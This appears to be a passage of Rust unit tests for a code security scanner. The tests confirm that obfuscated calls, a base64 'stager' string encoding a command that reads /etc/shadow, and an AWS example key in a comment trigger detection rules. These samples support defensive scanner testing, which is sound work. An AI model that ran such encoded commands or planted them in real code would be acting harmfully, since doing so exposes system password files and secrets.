        assert!(findings.iter().any(|f| f.rule_id == "NW-OBF-002"));
    }

    #[test]
    fn test_obfuscation_string_concat_detection() {
        let sample = "cmd = 'os.' + 'system'\n";
        let findings = scan_content(sample, Some("concat.py"));
        assert!(findings.iter().any(|f| f.rule_id == "NW-OBF-003"));
    }

    #[test]
    fn test_obfuscation_embedded_base64_payload_detection() {
        // "os.system('cat /etc/shadow')" encoded in base64 is "b3Muc3lzdGVtKCdjYXQgL2V0Yy9zaGFkb3cnKQ=="
        let sample = "const stager = 'b3Muc3lzdGVtKCdjYXQgL2V0Yy9zaGFkb3cnKQ==';\n";
        let findings = scan_content(sample, Some("stager.js"));
        assert!(findings.iter().any(|f| f.rule_id == "NW-OBF-004"));
    }

    #[test]
    fn test_comment_dangerous_code_suppression_and_secret_retention() {
        let comment_code = "// eval(user_input) is bad practice\n# os.system('echo test')\n";
        let findings = scan_content(comment_code, Some("docs.rs"));
        assert!(
            findings.is_empty(),
            "Dangerous code inside comments should not trigger false positives"
        );

        let comment_secret = "// Note: AWS key is AKIAIOSFODNN7EXAMPLE for dev\n";
        let secret_findings = scan_content(comment_secret, Some("notes.txt"));
        assert!(
            secret_findings.iter().any(|f| f.rule_id == "NW-SEC-001"),
            "Secrets in comments must be flagged"
        );
    }
}
